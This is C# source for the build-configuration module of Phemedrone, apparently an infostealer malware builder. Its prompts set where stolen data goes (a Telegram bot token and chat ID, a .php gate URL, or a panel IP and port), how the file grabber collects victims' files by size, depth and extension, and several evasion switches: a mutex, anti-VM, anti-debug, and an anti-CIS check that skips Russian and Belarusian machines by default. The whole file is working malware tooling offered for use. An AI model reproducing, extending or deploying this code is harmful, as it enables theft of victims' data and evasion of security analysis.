using System;
using System.Collections.Generic;
using Phemedrone.Tools.Interface;
using Phemedrone.Tools.Interface.Settings;

namespace Phemedrone.Tools.Builder
{
    public static class Arguments
    {
        public class Definition
        {
            public string ClassName { get; set; }
            public Dictionary<string, Func<object>> Arguments { get; set; }
        }
        
        public static readonly List<Definition> ServiceArguments = new List<Definition>
        {
            new Definition
            {
                ClassName = "Telegram",
                Arguments = new Dictionary<string, Func<object>>
                {
                    {
                        "token",
                        () => new InputSelection<string>(new InputSelectionSettings<string>
                        {
                            Title = "Enter your Telegram bot token",
                            Description = "You may create a new bot in @BotFather",
                            IsRequired = true,
                            Regex = @"^\d+:[A-Za-z0-9_-]+$"
                        }).Draw()
                    },
                    {
                        "chat_id",
                        () => new InputSelection<string>(new InputSelectionSettings<string>
                        {
                            Title = "Enter your Telegram chat ID",
                            Description = "Your chat ID can be found in @chatIDrobot",
                            IsRequired = true,
                            Regex = @"^-?\d+$"
                        }).Draw()
                    }
                }
            },
            
            new Definition
            {
                ClassName = "Gate",
                Arguments = new Dictionary<string, Func<object>>
                {
                    {
                        "gate_url",
                        () => new InputSelection<string>(new InputSelectionSettings<string>
                        {
                            Title = "Enter your gate URL",
                            Description = "Make sure your url ends with .php",
                            IsRequired = true,
                            Regex = @"\bhttps?://\S+\.php\b"
                        }).Draw()
                    }
                }
            },
            
            new Definition
            {
                ClassName = "Panel",
                Arguments = new Dictionary<string, Func<object>>
                {
                    {
                        "ip",
                        () => new InputSelection<string>(new InputSelectionSettings<string>
                        {
                            Title = "Enter IP and Port to your panel",
                            Description = "Example: 127.0.0.1:3322",
                            IsRequired = true,
                            Regex = @"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+"
                        }).Draw()
                    }
                }
            }
        };

        public static readonly Dictionary<string, Func<object>> DefaultArguments = new Dictionary<string, Func<object>>
        {
            {
                "Tag",
                () => new InputSelection<string>(new InputSelectionSettings<string>
                {
                    Title = "Enter your build tag",
                    Description = "You may use any tag you want",
                    DefaultValue = "Default"
                }).Draw()
            },
            {
                "GrabberFileSize",
                () => new InputSelection<int>(new InputSelectionSettings<int>
                {
                    Title = "Enter maximum size for grabbed files in MB",
                    Description = "This number determines the maximum size of FileGrabber folder",
                    DefaultValue = 5,
                    Regex = "^[0-9]{0,2}$"
                }).Draw()
            },
            {
                "GrabberDepth",
                () => new InputSelection<int>(new InputSelectionSettings<int>
                {
                    Title = "Enter a depth number for grabbing files",
                    Description = "Numbers more than 1 determine how deep files will get grabbed in subfolders",
                    DefaultValue = 2,
                    Regex = "^[0-9]{0,1}$"
                }).Draw()
            },
            {
                "FilePatterns",
                () => new ArraySelection<List<string>>(new DefaultSettings
                {
                    Title = "Enter file grabber extensions",
                    Description = "Should look like this *.txt. Leave blank for none"
                }).Draw()
            },
            {
                "MutexValue",
                () => new InputSelection<string>(new InputSelectionSettings<string>
                {
                    Title = "Enter build mutex",
                    Description = "If you want to disable mutex checking, leave it blank",
                    DefaultValue = ""
                }).Draw()
            },
            {
                "AntiVm",
                () => new BooleanSelection(new BooleanSelectionSettings
                {
                    Title = "Enable anti virtualized environment",
                    Description = "If yes, build will not work on VMs, RDPs etc.",
                    DefaultValue = false
                }).Draw()
            },
            {
                "AntiCIS",
                () => new BooleanSelection(new BooleanSelectionSettings
                {
                    Title = "Enable anti CIS environments",
                    Description = "If yes, build will not work on devices from CIS countries (Russia, Belarus etc.)",
                    DefaultValue = true
                }).Draw()
            },
            {
                "AntiDebug",
                () => new BooleanSelection(new BooleanSelectionSettings
                {
                    Title = "Enable anti debugging environment",
                    Description = "If yes, build will not work on devices with debugging tools launched",
                    DefaultValue = false
                }).Draw()
            }
        };
    }
}